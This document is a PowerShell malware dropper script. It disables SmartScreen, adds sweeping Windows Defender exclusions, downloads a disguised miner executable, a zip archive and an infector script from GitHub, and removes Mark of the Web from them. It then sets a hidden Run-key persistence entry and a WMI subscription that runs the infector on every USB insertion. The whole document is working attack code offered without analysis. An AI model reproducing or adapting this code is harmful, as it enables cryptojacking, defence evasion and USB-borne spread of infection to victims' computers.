Start-Sleep -Seconds 15

$logPath = "C:\Windows\Temp\boot_execution_log.txt"
$logDirectory = Split-Path -Path $logPath -Parent

if (-not (Test-Path -Path $logDirectory)) {
    New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
    Add-Content -Path $logPath -Value "Created log directory: $logDirectory"
}

Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account."

function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
if (Is-Admin) {
    Add-Content -Path $logPath -Value "Confirmed: Script is running with Administrator (SYSTEM) privileges."
} else {
    Add-Content -Path $logPath -Value "WARNING: Script is NOT running with Administrator privileges."
}

$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
$payloadPath = "C:\Windows\Temp\svchost_update.exe"
$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore.zip"
$crackedSoftwareZipPath = "C:\Windows\Temp\update_package.zip"
$crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
$crackedSoftwareExe = "$crackedSoftwareFolder\SystemCore\ServiceHost.exe"
$infectorUrl = "https://github.com/NaomiMendoza127/filetest12345/raw/refs/heads/main/infector.ps1"
$infectorPath = "C:\Windows\Temp\infect.ps1"

Add-Content -Path $logPath -Value "Attempting to disable SmartScreen..."
try {
    $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
    try {
        Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
        Add-Content -Path $logPath -Value "SmartScreen disabled successfully."
    } catch {
        Add-Content -Path $logPath -Value "Failed to disable SmartScreen: $_"
    }
    $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
    if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
        Add-Content -Path $logPath -Value "Confirmed: SmartScreen is disabled."
    } else {
        Add-Content -Path $logPath -Value "SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
    }
} catch {
    Add-Content -Path $logPath -Value "Failed to check SmartScreen status: $_"
}

Add-Content -Path $logPath -Value "Checking for existing svchost_update.exe at $payloadPath."

if (Test-Path -Path $payloadPath) {
    Add-Content -Path $logPath -Value "Existing svchost_update.exe found at $payloadPath."
    if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
        Add-Content -Path $logPath -Value "Warning: Existing file does not have .exe extension."
    } else {
        Add-Content -Path $logPath -Value "File exists at $payloadPath with .exe extension."
    }
    $existingSize = (Get-Item -Path $payloadPath).Length
    Add-Content -Path $logPath -Value "Existing file size: $existingSize bytes."
    try {
        Unblock-File -Path $payloadPath -ErrorAction Stop
        Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
    } catch {
        Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
    }
    try {
        Add-Content -Path $logPath -Value "Attempting to execute existing payload..."
        Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
        Add-Content -Path $logPath -Value "Existing payload executed successfully."
    } catch {
        Add-Content -Path $logPath -Value "Execution failed: $_"
        throw "Failed to execute existing payload."
    }
}

Add-Content -Path $logPath -Value "Waiting for Windows Defender service to be fully ready..."
$maxAttempts = 20
$delayBetweenChecks = 5
for ($i = 0; $i -lt $maxAttempts; $i++) {
    try {
        $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
        $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
            Add-Content -Path $logPath -Value "Windows Defender service is running and Real-time Protection is enabled."
            break
        }
    } catch {
        Add-Content -Path $logPath -Value "Attempt $($i+1): Defender service not yet found or ready. Error: $_. Waiting..."
    }
    Start-Sleep -Seconds $delayBetweenChecks
    if ($i -eq ($maxAttempts - 1)) {
        Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be fully ready. Proceeding with exclusions."
    }
}
Add-Content -Path $logPath -Value "Finished adaptive wait. Proceeding with Defender exclusions."

Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."
$exclusionsPaths = @(
    "C:\Users\Public\SystemLib",
    "C:\Windows\Temp\svchost_update.exe",
    "C:\Windows\Temp\WindowsServices",
    "C:\Windows\Temp\update_package.zip",
    "C:\ProgramData\WinKit",
    "C:\Windows\Temp\*",
    "C:\ProgramData\Microsoft\Windows\Temp",
    "C:\Users\*\AppData\Local\Temp",
    "C:\Windows\System32\Tasks",
    "C:\Windows\SysWOW64\Tasks",
    "C:\Program Files\McAfee",
    "C:\Program Files\Symantec",
    "C:\Program Files\Kaspersky Lab",
    "C:\Program Files\Avast Software",
    "C:\Program Files\AVG"
)
$exclusionsProcesses = @(
    "svchost_update.exe",
    "ServiceHost.exe",
    "cmd.exe",
    "powershell.exe"
)
$exclusionsExtensions = @(
    "exe",
    "dll",
    "bat",
    "cmd",
    "ps1",
    "vbs",
    "js",
    "zip"
)
foreach ($excl in $exclusionsPaths) {
    try {
        $currentExclusions = Get-MpPreference
        $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
        if (-not $pathExists) {
            Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
            Add-Content -Path $logPath -Value "Exclusion path added: $excl"
        } else {
            Add-Content -Path $logPath -Value "Exclusion path already exists: $excl"
        }
    } catch {
        Add-Content -Path $logPath -Value "Failed to add exclusion path: $excl - Error: $_"
    }
}
foreach ($excl in $exclusionsProcesses) {
    try {
        $currentExclusions = Get-MpPreference
        $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
        if (-not $processExists) {
            Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
            Add-Content -Path $logPath -Value "Exclusion process added: $excl"
        } else {
            Add-Content -Path $logPath -Value "Exclusion process already exists: $excl"
        }
    } catch {
        Add-Content -Path $logPath -Value "Failed to add exclusion process: $excl - Error: $_"
    }
}
foreach ($excl in $exclusionsExtensions) {
    try {
        $currentExclusions = Get-MpPreference
        $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $excl }) -ne $null
        if (-not $extensionExists) {
            Add-MpPreference -ExclusionExtension $excl -ErrorAction SilentlyContinue
            Add-Content -Path $logPath -Value "Exclusion extension added: $excl"
        } else {
            Add-Content -Path $logPath -Value "Exclusion extension already exists: $excl"
        }
    } catch {
        Add-Content -Path $logPath -Value "Failed to add exclusion extension: $excl - Error: $_"
    }
}
Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."

Add-Content -Path $logPath -Value "Checking for existing WindowsServices folder at $crackedSoftwareFolder."
if (-not (Test-Path -Path $crackedSoftwareFolder)) {
    Add-Content -Path $logPath -Value "WindowsServices folder not found. Downloading from $crackedSoftwareZipUrl..."
    try {
        if (-not (Test-Path -Path (Split-Path -Path $crackedSoftwareZipPath -Parent))) {
            New-Item -ItemType Directory -Path (Split-Path -Path $crackedSoftwareZipPath -Parent) -Force | Out-Null
            Add-Content -Path $logPath -Value "Created directory for update package: $(Split-Path -Path $crackedSoftwareZipPath -Parent)."
        }
        $zipResponse = Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -PassThru
        Add-Content -Path $logPath -Value "Update package downloaded to $crackedSoftwareZipPath. Content-Type: $($zipResponse.Headers['Content-Type'])"
        if (-not (Test-Path -Path $crackedSoftwareZipPath)) {
            throw "Downloaded zip file not found at $crackedSoftwareZipPath."
        }
        try {
            Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
            Add-Content -Path $logPath -Value "Extracted update package to $crackedSoftwareFolder."
        } catch {
            Add-Content -Path $logPath -Value "Failed to extract update package: $_"
            throw "Extraction failed."
        }
        if (-not (Test-Path -Path $crackedSoftwareExe)) {
            Add-Content -Path $logPath -Value "Warning: ServiceHost.exe not found in $crackedSoftwareFolder\SystemCore."
            throw "Update executable missing."
        }
        try {
            Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
            Add-Content -Path $logPath -Value "Removed Mark of the Web from files in $crackedSoftwareFolder."
        } catch {
            Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $crackedSoftwareFolder files: $_"
        }
    } catch {
        Add-Content -Path $logPath -Value "Failed to download or process update package: $_"
    }
} else {
    Add-Content -Path $logPath -Value "WindowsServices folder already exists at $crackedSoftwareFolder."
    if (-not (Test-Path -Path $crackedSoftwareExe)) {
        Add-Content -Path $logPath -Value "Warning: ServiceHost.exe not found in $crackedSoftwareFolder\SystemCore."
    } else {
        Add-Content -Path $logPath -Value "Confirmed: ServiceHost.exe exists in $crackedSoftwareFolder\SystemCore."
    }
}

if (-not (Test-Path -Path $payloadPath)) {
    Add-Content -Path $logPath -Value "No existing svchost_update.exe found at $payloadPath. Downloading svchost_update.exe..."
    try {
        if (-not (Test-Path -Path (Split-Path -Path $payloadPath -Parent))) {
            New-Item -ItemType Directory -Path (Split-Path -Path $payloadPath -Parent) -Force | Out-Null
            Add-Content -Path $logPath -Value "Created payload directory: $(Split-Path -Path $payloadPath -Parent)."
        }
        $webResponse = Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -PassThru
        Add-Content -Path $logPath -Value "EXE payload downloaded to $payloadPath. Content-Type: $($webResponse.Headers['Content-Type'])"
        $downloadedSize = (Get-Item -Path $payloadPath).Length
        Add-Content -Path $logPath -Value "Downloaded file size: $downloadedSize bytes."
        if (-not (Test-Path -Path $payloadPath)) {
            throw "Downloaded file not found at $payloadPath."
        }
        if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
            Add-Content -Path $logPath -Value "Warning: Downloaded file does not have .exe extension."
        }
        Add-Content -Path $logPath -Value "File exists at $payloadPath with .exe extension."
        try {
            Unblock-File -Path $payloadPath -ErrorAction Stop
            Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
        } catch {
            Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
        }
        Add-Content -Path $logPath -Value "svchost_update.exe downloaded successfully but not executed, as per configuration."
    } catch {
        Add-Content -Path $logPath -Value "Failed to fetch svchost_update.exe from $payloadUrl. Error: $_"
    }
}

Add-Content -Path $logPath -Value "Checking for existing infect.ps1 at $infectorPath..."
if (-not (Test-Path -Path $infectorPath)) {
    Add-Content -Path $logPath -Value "Infect.ps1 not found. Downloading from $infectorUrl..."
    try {
        if (-not (Test-Path -Path (Split-Path -Path $infectorPath -Parent))) {
            New-Item -ItemType Directory -Path (Split-Path -Path $infectorPath -Parent) -Force | Out-Null
            Add-Content -Path $logPath -Value "Created directory for infect.ps1: $(Split-Path -Path $infectorPath -Parent)."
        }
        Invoke-WebRequest -Uri $infectorUrl -OutFile $infectorPath -UseBasicParsing -TimeoutSec 60
        Unblock-File -Path $infectorPath -ErrorAction Stop
        Add-Content -Path $logPath -Value "Infect.ps1 downloaded successfully to $infectorPath."
    } catch {
        Add-Content -Path $logPath -Value "Failed to download infect.ps1: $_"
    }
} else {
    Add-Content -Path $logPath -Value "Infect.ps1 already exists at $infectorPath. Skipping download."
}

Add-Content -Path $logPath -Value "Checking registry key for persistence..."
try {
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regName = "WindowsUpdateCheck"
    $scriptPath = $PSCommandPath
    $command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $regExists = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
    if ($regExists -and $regExists.WindowsUpdateCheck -eq $command) {
        Add-Content -Path $logPath -Value "Registry key already exists and correctly configured: $regPath\$regName"
    } else {
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
            Add-Content -Path $logPath -Value "Created registry path: $regPath"
        }
        Set-ItemProperty -Path $regPath -Name $regName -Value $command -ErrorAction Stop
        Add-Content -Path $logPath -Value "Registry key set or updated: $regPath\$regName"
    }
} catch {
    Add-Content -Path $logPath -Value "Failed to check or set registry key: $_"
}

Add-Content -Path $logPath -Value "Creating permanent WMI subscription for USB monitoring..."
try {
    $filterName = "USBInfectFilter"
    $consumerName = "USBInfectConsumer"

    # Create event filter for USB insertion
    $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
        Name = $filterName
        EventNameSpace = "root\cimv2"
        QueryLanguage = "WQL"
        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_LogicalDisk' AND TargetInstance.DriveType = 2"
        EventNamespace = "root\cimv2"
    } -ErrorAction Stop

    # Create command-line consumer to execute the infection script
    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
        Name = $consumerName
        CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$infectorPath`" -DriveLetter %DriveLetter%"
    } -ErrorAction Stop

    # Bind filter to consumer
    $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
        Filter = $filter
        Consumer = $consumer
    } -ErrorAction Stop

    Add-Content -Path $logPath -Value "Permanent WMI subscription created successfully for USB monitoring."
} catch {
    Add-Content -Path $logPath -Value "Failed to create permanent WMI subscription: $_"
}

# Removed the polling loop as WMI will handle USB detection
Add-Content -Path $logPath -Value "Script execution finished at $(Get-Date)."
